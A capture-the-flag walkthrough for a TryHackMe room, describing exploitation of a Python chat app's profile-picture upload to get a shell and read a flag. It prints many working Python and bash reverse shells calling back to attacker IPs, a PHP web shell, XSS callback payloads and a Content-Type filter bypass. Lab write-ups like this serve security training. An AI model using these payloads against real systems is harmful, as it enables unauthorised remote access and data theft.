<div align="center">

<img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" alt="TryHackMe" width="260"/>

<br/>

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Speed%20Chatting-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![Category](https://img.shields.io/badge/Category-Web%20Exploitation-blue?style=for-the-badge&logo=python&logoColor=white)](#)
[![Technique](https://img.shields.io/badge/Technique-File%20Upload%20Bypass-orange?style=for-the-badge&logo=shield&logoColor=white)](#)

# 🗨️ Speed Chatting — Solution Walkthrough

*A file-upload exploitation challenge where patience and methodical enumeration are your best weapons.*

</div>

---

## 🔍 Step 1 — Initial Reconnaissance

After obtaining the target IP from the room page, the first step was to visit the application in the browser.

![homepage](homepage_look.png)

Once the page loaded, the target's interface was clearly visible.

![homepage](homepage_1.png)

This was our first look at the target. The interactive elements available were: changing the profile picture, typing a message, and sending it.

Noticing that file uploads were possible was the key observation here.

---

## 🐍 Step 2 — Identifying the Backend

When we inspected the HTTP response headers, the server identified itself as a **Python server**.

So the natural next step was to attempt uploading Python reverse shells.

We tried several reverse shells with the listener running using **`ncat -lvnp 1234`**:

**Reverse Shell 1**

```
export RHOST="10.49.145.217";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

**Reverse Shell 2**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.49.145.217",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

**Reverse Shell 3**

```
export RHOST="10.49.145.217";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

**Reverse Shell 4**

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.49.145.217",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

**Reverse Shell 5**

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.49.145.217",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

**Reverse Shell 6**

```python
import os,socket,subprocess;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.29.213",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);
```

I uploaded each reverse shell file using the profile picture upload feature — but none of them gave a connection back.

---

## 🧪 Step 3 — Testing Payload Execution

Time to step back and think differently. Before jumping straight into a reverse shell, we needed to confirm whether the server was actually **executing** uploaded files at all.

We set up a simple Python HTTP server:

```
python -m http.server 5555
```

Then uploaded the following HTML file to test for a callback:

```html
<img src="http://YOUR_IP:5555/ping">
```

We waited — but no hit arrived on the server.

Then something interesting turned up in the page source. The uploaded file's path was visible in the HTML:

```html
<img src='/uploads/profile_44286c38-3bde-46f8-b7b3-e3b03a1651ff.html' class='profile-pic' alt='Profile Picture' 
     onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22150%22%3E%3Ccircle cx=%2275%22 cy=%2275%22 r=%2275%22 fill=%22%23f48fb1%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22white%22 font-size=%2250%22%3E%E2%9D%A4%EF%B8%8F%3C/text%3E%3C/svg%3E'">
```

The file was being stored at `/uploads/...` — and when we opened that URL directly in a new tab, the ping **did** land on our Python server. 💡

**The mistake was clear:** after uploading the payload, we had to manually open the file's URL in a new tab to trigger execution.

---

## 🔄 Step 4 — Retrying Payloads (with the Correct Trigger)

Armed with that knowledge, we went back to the reverse shells — this time opening the uploaded file in a new tab after each attempt.

**Payload 1**

```
export RHOST="10.49.145.217";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Still no shell.

**Payload 2**

```
export RHOST="10.49.145.217";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Still no shell.

**Payload 3**

```
export RHOST="192.168.164.54";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Still no shell.

**Payload 4**

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.164.54",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Still no shell.

**Payload 5**

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.164.54",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

Still no shell.

**Payload 6**

```python
import os,socket,subprocess;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.164.54",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);
```

Still didn't work.

---

## 🔎 Step 5 — PHP Upload Behaviour & Vulnerability Narrowing

Something interesting stood out at this point: whenever a **PHP file** was uploaded and opened in a new tab, the browser **downloaded** it rather than executing it. That ruled out PHP server-side execution.

We also tested a few simpler payloads:

**Simple Payload 1**

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.164.54/1234 0>&1'")
```

**Simple Payload 2**

```bash
/bin/bash -i >& /dev/tcp/192.168.29.213/1234 0>&1
```

**Simple Payload 3 & 4** (PHP command execution probes)

```php
<?php echo shell_exec(whoami); ?>
```

Also tried with a double extension: `a.jpg.php` — but these were downloaded rather than executed.

At this stage, we started thinking more about the vulnerability type. If an uploaded file triggered a callback *without* manually opening it, that would point to **SSRF**. If JavaScript was executing from the upload, that would be **XSS**. Testing both vectors:

```html
<img src="http://YOUR-IP:8000/test">
```

```html
<img src="x" onerror="fetch('http://YOUR-IP:8000/xss')">
```

```html
<img src="invalid.jpg" onerror="alert(1)">
```

> ⚠️ **Note:** Up until this point the testing had been done on Windows, which caused some friction. Switching to a Linux machine made the rest of the process significantly smoother.

---

## 🔧 Step 6 — Intercepting with Burp Suite

We opened **Burp Suite** and intercepted the upload request to manipulate the `Content-Type` header.

We uploaded this PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

And changed the `Content-Type` to **`image/jpeg`** in Burp to see if the filter could be bypassed.

The upload accepted it — but execution still wasn't reliable at that point, since the Python server was the backend, not PHP.

---

## ✂️ Step 7 — Trimming the Python Reverse Shells

Looking back at reverse shells 2, 4, and 5, the key insight was that we needed to **strip the `export` wrappers** and inline everything — the way the Python interpreter would parse it when the file was executed directly.

**Trimmed Reverse Shell 1**

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_tun0_ip>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

After uploading and opening the file URL — the listener got a hit! But the shell closed instantly.

![listener](listener.png)

That was progress. There was now clear proof of execution — the connection was reaching us, just not staying open.

We tried changing the port to rule out a firewall issue:

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your_tun0_ip>",1233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

Same result. Changing the filename also gave the same outcome.

**Trimmed Reverse Shell 4**

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.49.145.217",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

![listener](listener.png)

**Trimmed Reverse Shell 5**

```
import os,pty,socket;s=socket.socket();s.connect(("10.49.145.217",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
```

![listener](listener.png)

---

## 🐚 Step 8 — Getting a Stable Shell

Back to **Reverse Shell 6**, but this time with a key modification: **removing the trailing semicolons** from each line.

```python
import os,socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.246.164",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

> 💡 **Key Takeaway:** When the code is spread across multiple lines, trailing semicolons are not needed — and in this particular environment they were causing the script to fail silently. If you're writing everything on a single line, semicolons are required as statement separators.

With the semicolons removed, the shell came back **and stayed open**. 🎉

![shell](shell.png)

---

## 🏁 Q1 — What is the flag?

Once inside the shell, the flag file was sitting right there in the current working directory:

```bash
cat flag.txt
```

The `flag.txt` file in the current directory contains the flag. ✅

---

<div align="center">

[![TryHackMe](https://img.shields.io/badge/Room-Speed%20Chatting-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![Technique](https://img.shields.io/badge/Exploit-File%20Upload%20%2B%20Python%20RCE-orange?style=for-the-badge&logo=python&logoColor=white)](#)

*Happy Hacking — ethically and relentlessly.* 🔐

</div>
